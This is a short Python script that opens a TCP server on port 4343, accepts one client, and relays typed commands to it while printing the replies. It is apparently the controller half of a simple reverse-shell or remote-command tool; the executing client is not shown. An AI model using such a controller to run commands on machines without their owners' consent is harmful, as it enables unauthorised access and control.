#!/bin/python3

import socket
import subprocess

host = input("Enter your host ip address: ")
port = 4343

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
server.bind((host, port))
print("[+] server started ...")
print("[+] listening for client connection...")
server.listen(1)
client, client_addr = server.accept()
print(f"[+] {client_addr} client connected...")

while True:
    command = input('enter command: ')
    command = command.encode()
    client.send(command)
    print(f"[+] command sent ")    
    output = client.recv(1024)
    output = output.decode()
    print(f"output: {output}")

client.close()
server.close()
